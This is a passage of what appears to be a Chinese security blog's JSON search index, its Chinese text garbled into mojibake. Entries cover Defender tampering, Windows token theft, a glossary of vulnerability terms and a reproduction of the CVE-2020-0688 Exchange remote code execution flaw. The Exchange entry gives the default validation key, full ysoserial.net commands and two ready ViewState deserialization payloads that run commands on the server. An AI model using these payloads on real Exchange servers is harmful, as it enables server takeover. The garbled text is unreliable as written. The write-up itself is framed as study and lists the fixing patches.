Defenderå¤±æ•ˆï¼šé˜»æ­¢éPPLè¿›ç¨‹ä¿®æ”¹PPLè¿›ç¨‹MsMpEng.exeçš„tokenï¼Œå·¥å…·å¯å‚è€ƒï¼šhttps://github.com/elastic/PPLGuard 0x09 å°ç»“ äº†è§£ Defenderï¼Œå¦‚ä½•ä½¿ç”¨ï¼Œå¹¶é€šè¿‡ç›¸å…³å¯ä»¥æ“ä½œçš„è¡Œä¸ºå»é¿å…å…¶å¤±æ•ˆçš„æƒ…å†µã€‚æœ€é‡è¦çš„æ˜¯ä¸€å®šè¦å°è¯•ã€‚","tags":[{"name":"Windows Defender","slug":"Windows-Defender","permalink":"https://hodlyounger.github.io/tags/Windows-Defender/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Defender","slug":"A-OS/Windows/Defender","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Defender/"}]},{"title":"ã€æƒé™ä¸ä¼šè¯ã€‘Tokençªƒå–ä¸åˆ©ç”¨","date":"2024-06-16T16:00:00.000Z","path":"A_OS/Windows/æƒé™ä¸ä¼šè¯/ã€æƒé™ä¸ä¼šè¯ã€‘Tokençªƒå–ä¸åˆ©ç”¨/","text":"æ¦‚è¿°ï¼šWindows Token çš„çªƒå–ä¸åˆ©ç”¨ã€incognito å·¥å…·çš„ä½¿ç”¨ã€è·å– System å’Œ TrustedInstaller æƒé™ ç›¸å…³æ¨èï¼š æ¸—é€æŠ€å·§â€”â€”Tokençªƒå–ä¸åˆ©ç”¨ [toc]","tags":[{"name":"æƒé™ä¸ä¼šè¯","slug":"æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/tags/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"},{"name":"Token","slug":"Token","permalink":"https://hodlyounger.github.io/tags/Token/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æƒé™ä¸ä¼šè¯","slug":"A-OS/Windows/æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"ã€æ¼æ´ã€‘ç›¸å…³åè¯","date":"2024-06-03T16:00:00.000Z","path":"E_æ‰‹å†Œ/æ¼æ´è¯´æ˜/ã€æ¼æ´ã€‘ç›¸å…³åè¯/","text":"æ¦‚è¿°ï¼šæ¼æ´ç›¸å…³åè¯è¯´æ˜ [toc] POCï¼ˆProof of Conceptï¼‰ æ¼æ´è¯æ˜ï¼Œæ¼æ´æŠ¥å‘Šä¸­ï¼Œé€šè¿‡ä¸€æ®µæè¿°æˆ–ä¸€ä¸ªæ ·ä¾‹æ¥è¯æ˜æ¼æ´ç¡®å®å­˜åœ¨ EXPï¼ˆExploitï¼‰ æ¼æ´åˆ©ç”¨ï¼ŒæŸä¸ªæ¼æ´å­˜åœ¨EXPï¼Œæ„æ€å°±æ˜¯è¯¥æ¼æ´å­˜åœ¨å…¬å¼€çš„åˆ©ç”¨æ–¹å¼ï¼ˆæ¯”å¦‚ä¸€ä¸ªè„šæœ¬ï¼‰ 0DAY å«ä¹‰æ˜¯åˆšåˆšè¢«å‘ç°ï¼Œè¿˜æ²¡æœ‰è¢«å…¬å¼€çš„æ¼æ´ï¼Œä¹Ÿæ²¡æœ‰ç›¸åº”çš„è¡¥ä¸ç¨‹åºï¼Œå¨èƒæå¤§ã€‚ CVEï¼ˆCommon Vulnerabilities &amp; Exposuresï¼‰ å…¬å…±æ¼æ´å’Œæš´éœ²ï¼ŒCVEå°±å¥½åƒæ˜¯ä¸€ä¸ªå­—å…¸è¡¨ï¼Œä¸ºå¹¿æ³›è®¤åŒçš„ä¿¡æ¯å®‰å…¨æ¼æ´æˆ–è€…å·²ç»æš´éœ²å‡ºæ¥çš„å¼±ç‚¹ç»™å‡ºä¸€ä¸ªå…¬å…±çš„åç§°ã€‚ä½¿ç”¨ä¸€ä¸ªå…±åŒçš„åå­—ï¼Œå¯ä»¥å¸®åŠ©ç”¨æˆ·åœ¨å„è‡ªç‹¬ç«‹çš„å„ç§æ¼æ´æ•°æ®åº“ä¸­å’Œæ¼æ´è¯„ä¼°å·¥å…·ä¸­å…±äº«æ•°æ® ã€‚å¦‚æœåœ¨ä¸€ä¸ªæ¼æ´æŠ¥å‘Šä¸­æŒ‡æ˜çš„ä¸€ä¸ªæ¼æ´ï¼Œå¦‚æœæœ‰CVEåç§°ï¼Œä½ å°±å¯ä»¥å¿«é€Ÿåœ°åœ¨ä»»ä½•å…¶å®ƒCVEå…¼å®¹çš„æ•°æ®åº“ä¸­æ‰¾åˆ°ç›¸åº”ä¿®è¡¥çš„ä¿¡æ¯ï¼Œè§£å†³å®‰å…¨é—®é¢˜ ã€‚ å®˜ç½‘ï¼šCVE -CVE ä¸­æ–‡æœç´¢ï¼šhttp://vulhub.org.cn/search CAN CANå’ŒCVEçš„å”¯ä¸€åŒºåˆ«æ˜¯å‰è€…ä»£è¡¨äº†å€™é€‰æ¡ç›®ï¼Œè¿˜æœªç»CVEç¼–è¾‘å§”å‘˜ä¼šè®¤å¯ï¼Œè€Œåè€…åˆ™æ˜¯ç»è¿‡è®¤å¯çš„æ¡ç›®ã€‚ ç„¶åï¼Œä¸¤ç§ç±»å‹çš„æ¡ç›®éƒ½å¯¹å…¬ä¼—å¯è§ï¼Œæ¡ç›®çš„ç¼–å·ä¸ä¼šéšç€è®¤å¯è€Œæ”¹å˜â€”ä»…ä»…æ˜¯â€œCANâ€å‰ç¼€æ›¿æ¢æˆäº†â€œCVEâ€ã€‚ BUGTRAQ ä¸€ä¸ªå®Œæ•´çš„å¯¹è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼ˆå®ƒä»¬æ˜¯ä»€ä¹ˆï¼Œå¦‚ä½•åˆ©ç”¨å®ƒä»¬ï¼Œä»¥åŠå¦‚ä½•ä¿®è¡¥å®ƒä»¬ï¼‰çš„å…¬å‘ŠåŠè¯¦ç»†è®ºè¿°è¿›è¡Œé€‚åº¦æŠ«éœ²çš„é‚®ä»¶åˆ—è¡¨ å·²åœæ›´ï¼Œåœ°å€ï¼šBugtraq Mailing List CNCVE ä¸­å›½ï¼ˆCNï¼‰çš„ CVE ï¼Œæ˜¯CNCERT/CCï¼ˆå›½å®¶è®¡ç®—æœºç½‘ç»œåº”æ€¥å¤„ç†åè°ƒä¸­å¿ƒï¼‰ä¸ºæ¼æ´è¿›è¡Œç¼–å·çš„ä¸€ä¸ªè‡ªå·±çš„æ ‡å‡†ã€‚CNCVEä¸ä½†åŒ…å«æ¼æ´çš„æè¿°äºˆä»¥ç»Ÿä¸€å®šä¹‰ï¼Œè¿˜å°†åŒ…æ‹¬æ¼æ´çš„è¡¥ä¸ã€éªŒè¯ç­‰æªæ–½ï¼Œæ›´æ–¹ä¾¿ã€æœ‰ç”¨ã€‚ CNVD å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°ã€‚æ˜¯ç”±å›½å®¶è®¡ç®—æœºç½‘ç»œåº”æ€¥æŠ€æœ¯å¤„ç†åè°ƒä¸­å¿ƒï¼ˆç®€ç§°CNCERTï¼‰è”åˆå›½å†…é‡è¦ä¿¡æ¯ç³»ç»Ÿå•ä½ã€åŸºç¡€ç”µä¿¡è¿è¥å•†ã€ç½‘ç»œå®‰å…¨å‚å•†ã€è½¯ä»¶å‚å•†å’Œäº’è”ç½‘ä¼ä¸šå»ºç«‹çš„ä¿¡æ¯å®‰å…¨æ¼æ´ä¿¡æ¯å…±äº«çŸ¥è¯†åº“ã€‚ å®˜ç½‘ï¼šhttps://www.cnvd.org.cn/ CNNVD ä¸­å›½å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´åº“ã€‚æ˜¯ä¸­å›½ä¿¡æ¯å®‰å…¨æµ‹è¯„ä¸­å¿ƒä¸ºåˆ‡å®å±¥è¡Œæ¼æ´åˆ†æå’Œé£é™©è¯„ä¼°çš„èŒèƒ½ï¼Œè´Ÿè´£å»ºè®¾è¿ç»´çš„å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´åº“ï¼Œä¸ºæˆ‘å›½ä¿¡æ¯å®‰å…¨ä¿éšœæä¾›åŸºç¡€æœåŠ¡ å®˜ç½‘ï¼šå›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´åº“ CVSS(Common Vulnerability Scoring System) é€šç”¨æ¼æ´è¯„åˆ†ç³»ç»Ÿï¼Œè¡Œä¸šå…¬å¼€æ ‡å‡†ï¼Œç”¨æ¥è¯„æµ‹æ¼æ´çš„ä¸¥é‡ç¨‹åº¦ï¼Œ0-10åˆ†å€¼è¶Šé«˜è¶Šä¸¥é‡,ç¾å›½å›½å®¶æ¼æ´æ•°æ®åº“å®˜ç½‘ï¼šhttps://nvd.nist.gov/vuln/searchå¯æŸ¥è¯¢CVEå¯¹åº”CVSSåˆ†å€¼ PSï¼šè¯„åˆ†ä¼šå—æ—¶é—´å’Œç©ºé—´å½±å“ï¼Œå¦‚éšç€æ—¶é—´æ¨ç§»ï¼Œæ¼æ´ç›¸å…³è¡¥ä¸è¶Šå¤šï¼Œå¯è¢«åˆ©ç”¨æ€§è¶Šä½ï¼›æ¼æ´å­˜åœ¨ä¸åŒçš„ç¯å¢ƒï¼Œä¹Ÿä¼šå½±å“æ¼æ´çš„å¨èƒç¨‹åº¦ VULï¼ˆVulnerabilityï¼‰ æ¼æ´ CPEï¼ˆCommon Platform Enumerationï¼‰ ä»¥æ ‡å‡†åŒ–æ–¹å¼ä¸ºè½¯ä»¶åº”ç”¨ç¨‹åºã€æ“ä½œç³»ç»ŸåŠç¡¬ä»¶å‘½åçš„æ–¹æ³•","tags":[{"name":"æ¼æ´","slug":"æ¼æ´","permalink":"https://hodlyounger.github.io/tags/%E6%BC%8F%E6%B4%9E/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"æ¼æ´è¯´æ˜","slug":"E-æ‰‹å†Œ/æ¼æ´è¯´æ˜","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E/"}]},{"title":"ã€CVE-2020-0688ã€‘exchangeè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","date":"2024-06-03T09:10:21.798Z","path":"A_å†…åŠŸ/A_POCæ¢ç´¢/Exchange/ã€CVE-2020-0688ã€‘exchangeè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°/","text":"æ¦‚è¿°ï¼šCVE-2020-0688 æ¼æ´å¤ç°åŠåˆ†æ å…è´£å£°æ˜ï¼šæœ¬æ–‡æ‰€-æ¶‰åŠçš„ä¿¡æ¯å®‰å…¨æŠ€æœ¯çŸ¥è¯†ä»…ä¾›å‚è€ƒå’Œå­¦ä¹ ä¹‹ç”¨ï¼Œå¹¶ä¸æ„æˆä»»ä½•æ˜ç¤ºæˆ–æš—ç¤ºçš„ä¿è¯ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡æä¾›çš„ä¿¡æ¯æ—¶ï¼Œåº”è‡ªè¡Œåˆ¤æ–­å…¶é€‚ç”¨æ€§ï¼Œå¹¶æ‰¿æ‹…ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡é£é™©å’Œè´£ä»»ã€‚æœ¬æ–‡ä½œè€…å¯¹äºè¯»è€…åŸºäºæœ¬æ–‡å†…å®¹æ‰€åšå‡ºçš„ä»»ä½•è¡Œä¸ºæˆ–å†³å®šä¸æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œæœ¬æ–‡ä½œè€…ä¸å¯¹å› ä½¿ç”¨æœ¬æ–‡å†…å®¹è€Œå¯¼è‡´çš„ä»»ä½•ç›´æ¥ã€é—´æ¥ã€ç‰¹æ®Šæˆ–åæœæ€§æŸå¤±æ‰¿æ‹…è´£ä»»ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡å†…å®¹æ—¶åº”å½“éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œå¹¶ä¿è¯ä¸è¿åä»»ä½•ç›¸å…³æ³•å¾‹æ³•è§„ã€‚ ç›¸å…³å·¥å…·ä¸‹è½½åœ°å€ï¼šçˆ±ç›˜ - æœ€æ–°çš„åœ¨çº¿ç ´è§£å·¥å…·åŒ… æ³¨æ„è¿™ä¸ªæ¼æ´ä¿®å¤çš„ç‰ˆæœ¬ï¼Œéœ€è¦ä¿®å¤ä¹‹å‰çš„ç‰ˆæœ¬æ‰å¯ä»¥å¤ç°ã€‚æˆ‘è‡ªå·±åœ¨ Exchange 2016 cu21 ä¸Šé€šè¿‡ payload è¯·æ±‚å¯¹åº”çš„æ¥å£æ—¶è¿”å› 400ã€‚ [toc] æ¼æ´è¯´æ˜ å½±å“ç‰ˆæœ¬ Microsoft Exchange Server 2010 Service Pack 3 Microsoft Exchange Server 2013(cu23ä»¥ä¸‹) Microsoft Exchange Server 2016 (cu14ä»¥ä¸‹) Microsoft Exchange Server 2019(cu4ä»¥ä¸‹) æ¼æ´åŸç† è¿™ä¸ªæ¼æ´æ˜¯ç”±äºExchangeæœåŠ¡å™¨åœ¨å®‰è£…æ—¶æ²¡æœ‰æ­£ç¡®åœ°åˆ›å»ºå”¯ä¸€çš„åŠ å¯†å¯†é’¥æ‰€é€ æˆçš„ã€‚ å…·ä½“æ¥è¯´ï¼Œä¸æ­£å¸¸è½¯ä»¶å®‰è£…æ¯æ¬¡éƒ½ä¼šäº§ç”Ÿéšæœºå¯†é’¥ä¸åŒï¼Œæ‰€æœ‰Exchange Serveråœ¨å®‰è£…åçš„ web.config æ–‡ä»¶ä¸­éƒ½æ‹¥æœ‰ç›¸åŒçš„ validationKey å’Œ decryptionKeyã€‚è¿™äº›å¯†é’¥ç”¨äºä¿è¯ ViewState çš„å®‰å…¨æ€§ã€‚è€Œ ViewState æ˜¯ASP.NET Webåº”ç”¨ä»¥åºåˆ—åŒ–æ ¼å¼å­˜å‚¨åœ¨å®¢æˆ·æœºä¸Šçš„æœåŠ¡ç«¯æ•°æ®ã€‚å®¢æˆ·ç«¯é€šè¿‡__VIEWSTATEè¯·æ±‚å‚æ•°å°†è¿™äº›æ•°æ®è¿”å›ç»™æœåŠ¡å™¨ã€‚æ”»å‡»è€…å¯ä»¥åœ¨ ExchangeControl Panel web åº”ç”¨ä¸Šæ‰§è¡Œä»»æ„.netä»£ç ã€‚ å½“æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µè·å¾—ä¸€ä¸ªå¯ä»¥è®¿é—®Exchange Control Panel ï¼ˆECPï¼‰ç»„ä»¶çš„ç”¨æˆ·è´¦å·å¯†ç æ—¶ã€‚æ”»å‡»è€…å¯ä»¥åœ¨è¢«æ”»å‡»çš„exchangeä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œç›´æ¥è·å–æœåŠ¡å™¨æƒé™ã€‚ æ¼æ´å¤ç° æœ¬æ–‡å¤ç°ç¯å¢ƒï¼šExchange 2014 cu14 OS åç§°: Microsoft Windows Server 2016 Datacenter OS ç‰ˆæœ¬: 10.0.14393 æš‚ç¼º Build 14393 å‰ææ¡ä»¶ éœ€è¦ä»¥ä¸‹å››ä¸ªå˜é‡ æƒ³è¦åˆ©ç”¨è¯¥æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦å››ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ä¸ºï¼š â€“validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BFï¼ˆé»˜è®¤ï¼Œæ¼æ´äº§ç”ŸåŸå› ï¼‰ â€“validationalg = SHA1ï¼ˆé»˜è®¤ï¼Œæ¼æ´äº§ç”ŸåŸå› ï¼‰ â€“generator=B97B4E27ï¼ˆåŸºæœ¬é»˜è®¤ï¼‰ â€“viewstateuserkey = ASP.NET_SessionIdï¼ˆæ‰‹å·¥è·å–ï¼Œå˜é‡ï¼Œæ¯æ¬¡ç™»é™†éƒ½ä¸ä¸€è‡´ï¼‰ åœ¨è¿™å››ä¸ªå˜é‡ä¸­ï¼Œå‰ä¸¤ä¸ªä¸ºé»˜è®¤å›ºå®šï¼Œviewstateuserkey å’Œ generator çš„å€¼éœ€è¦ä»ç»è¿‡èº«ä»½éªŒè¯çš„ session ä¸­æ”¶é›†ã€‚viewstateuserkey å¯ä»¥ä»ASP.NETçš„_SessionID cookie ä¸­è·å–ï¼Œè€Œ generator å¯ä»¥åœ¨ä¸€ä¸ªéšè—å­—æ®µ__VIEWSTATEGENERATOR ä¸­æ‰¾åˆ°ã€‚æ‰€æœ‰è¿™äº›éƒ½å¯ä»¥é€šè¿‡æµè§ˆå™¨ä¸­çš„å·¥å…·è½»æ¾è·å–ã€‚ â­ è·å– viewstateuserkey å’Œ generator ç™»å½• Exchange é‚®ç®±é¡µé¢ï¼Œhttps://localhost/ecpï¼ˆç®¡ç†å‘˜é¡µé¢ï¼‰ æˆ–è€… https://localhost/owaï¼ˆä¸ªäººé¡µé¢ï¼‰ ç™»å½•æˆåŠŸåï¼Œé‡å®šåˆ° https://localhost/ecp/default.aspx é¡µé¢ï¼Œåœ¨ DevTools ä¸­ æŸ¥çœ‹ NetWork ä¸­çš„ Headersï¼Œæ‰¾åˆ° Cookie æ¡ç›®ï¼Œåœ¨ Cookieä¸­æ‰¾åˆ° ASP.NET_SessionId å­—æ®µå¹¶è·å–å€¼ã€‚ â­ åœ¨ Response é€‰é¡¹å¡è·å– __VIEWSTATEGENERATOR å­—æ®µå€¼ å¦‚æœæœªæ‰¾åˆ°æ­¤å­—æ®µä¸å¿…æ…Œå¼ ï¼Œç›´æ¥ä½¿ç”¨é»˜è®¤å€¼B97B4E27 å³å¯ã€‚æˆ‘è¿™è¾¹çš„ç¯å¢ƒæ˜¯ Exchange 2016 CU21 ï¼Œæ²¡æœ‰è¿™ä¸ªå­—æ®µã€‚ ä½¿ç”¨å·¥å…·ç”Ÿæˆ payload ä½¿ç”¨ysoserial.netå·¥å…·ç”Ÿæˆååºåˆ—åŒ–payloadã€‚ å·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://github.com/pwntester/ysoserial.net/ ç”Ÿæˆpayloadå‘½ä»¤ï¼š 1234567891011121314151617# å‚æ•°è¯´æ˜ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg=&quot;SHA1&quot; #é»˜è®¤ï¼Œæ¼æ´äº§ç”ŸåŸå› --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; #é»˜è®¤ï¼Œæ¼æ´äº§ç”ŸåŸå› --generator=&quot;B97B4E27&quot; # åŸºæœ¬é»˜è®¤ï¼Œå¦‚æœèƒ½è·å–åˆ°ï¼Œä»¥è·å–åˆ°çš„ä¸ºå‡†--viewstateuserkey=&quot;bf2c6983-d214-4c98-8bd3-d4ee908cc5f0&quot; # æ‰‹åŠ¨è·å–ï¼Œæ¯æ¬¡ç™»å½•éƒ½ä¸ä¸€è‡´--isdebug --islegacy# ä¸´æ—¶æ¨¡æ¿ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;148b5b17-445a-4480-a2cc-a19057786a50&quot; --isdebug --islegacy# ä¸´æ—¶æ¨¡æ¿ åˆ›å»ºæ–‡ä»¶ -c &quot;cmd /c echo test &gt; C:\\1.txt&quot;ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;cmd /c echo test &gt; C:\\\\1.txt&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;148b5b17-445a-4480-a2cc-a19057786a50&quot; --isdebug --islegacy ç”Ÿæˆå†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415# è¿è¡Œ calc.exeD:\\Release&gt;ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;148b5b17-445a-4480-a2cc-a19057786a50&quot; --isdebug --islegacyProvided __VIEWSTATEGENERATOR in uint: 3111865895simulateTemplateSourceDirectory returns: /simulateGetTypeName returns: default_aspxCalculated pageHashCode in uint (ignored): 3389719348%2FwEylQcAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC3BTw%2FeG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi0xNiI%2FPg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI%2BDQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BDQogICAgPHNkOlByb2Nlc3M%2BDQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8%2BDQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgY2FsYy5leGUiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M%2BDQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI%2BC5pwrvnjqqEqsSComECClVyJ7Frx# åˆ›å»ºæ–‡ä»¶D:\\Downloads\\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\\Release&gt;ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;cmd /c echo test &gt; C:\\1.txt&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;148b5b17-445a-4480-a2cc-a19057786a50&quot; --isdebug --islegacyProvided __VIEWSTATEGENERATOR in uint: 3111865895simulateTemplateSourceDirectory returns: /simulateGetTypeName returns: default_aspxCalculated pageHashCode in uint (ignored): 3389719348%2FwEyqwcAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADNBTw%2FeG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi0xNiI%2FPg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI%2BDQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BDQogICAgPHNkOlByb2Nlc3M%2BDQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8%2BDQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgY21kIC9jIGVjaG8gdGVzdCAmZ3Q7IEM6XDEudHh0IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8%2BDQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgv76towxj%2B573J47CKdC8RZqXwH9g%3D%3D ç„¶åå‘èµ·è¯·æ±‚å³å¯ï¼š æˆ‘è¿™è¾¹ä½¿ç”¨çš„ Postman ï¼Œè¯·æ±‚å†…å®¹æˆªå›¾å¦‚ä¸‹æ‰€ç¤ºï¼š æ‰§è¡Œç»“æœï¼š åœ¨æœåŠ¡å™¨é¡µé¢å¯ä»¥çœ‹åˆ° calc æˆåŠŸå¯åŠ¨ï¼ åˆ›å»ºæ–‡ä»¶ï¼š ç›¸å…³è¡¥ä¸ 1234567891011Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30 KB4536989Microsoft Exchange Server 2013 Cumulative Update 23 KB4536988Microsoft Exchange Server 2016 Cumulative Update 14 KB4536987Microsoft Exchange Server 2016 Cumulative Update 15 KB4536987Microsoft Exchange Server 2019 Cumulative Update 3 KB4536987Microsoft Exchange Server 2019 Cumulative Update 4 KB4536987 å…¶ä»–é—®é¢˜è¡¥å…… 1ã€å…³äºç‰ˆæœ¬ ã€2024å¹´5æœˆ23æ—¥11:39:21ã€‘è¿œå¤æ¼æ´ï¼Œæœ¬æ–‡ä»…é™äºå­¦ä¹ å’Œå¤ç°ï¼Œå·²ä¿®å¤ç‰ˆæœ¬æ˜ç¡®ï¼Œä¿®å¤ä¹‹å‰çš„ç‰ˆæœ¬åº”è¯¥æ˜¯å‡å¯ä»¥å¤ç°çš„ï¼Œå‚è€ƒè¡¥ä¸ç‰ˆæœ¬ 2ã€ __VIEWSTATEGENERATOR åœ¨æœ€åˆç‰ˆæœ¬çš„æ—¶å€™ä¸€ç›´æ²¡æœ‰è¿™ä¸ªå‚æ•°ï¼ˆç¡®å®ä¸é‡è¦ï¼ŒåŸºæœ¬ä¸ºé»˜è®¤å€¼ï¼‰ï¼Œé€ æˆè¿™ä¸€é—®é¢˜çš„ä¸»è¦åŸå› æ˜¯æ²¡æœ‰æ›´æ–°ç³»ç»Ÿè¡¥ä¸KB2919355ï¼Œæ›´æ–°è¯¥è¡¥ä¸åå°±ä¼šå‡ºç°__VIEWSTATEGENERATORå­—æ®µã€‚ 3ã€ æ— æ³•åˆ›å»ºæ–‡ä»¶ å¤§éƒ¨åˆ†å¤ç°è€…åªå¤ç°åˆ°å¯åŠ¨è®¡ç®—å™¨ï¼Œä½†æ˜¯å´æ— æ³•åˆ›å»ºæ–‡ä»¶ã€‚ä½†ç»è¿‡æµ‹è¯•å‘ç°é—®é¢˜å‡ºåœ¨ysoserial.exeçš„ -c å‚æ•°ä¸Šï¼Œè™½ç„¶åœ¨æ¼”ç¤ºè¿‡ç¨‹ä¸­å¯ä»¥ç›´æ¥ -c &quot;echo OOOPS!!! &gt; c:/Vuln_Server.txt&quot; åˆ›å»ºæ–‡ä»¶ï¼Œè®©äººè¯¯ä»¥ä¸º -c æ˜¯åœ¨ cmd 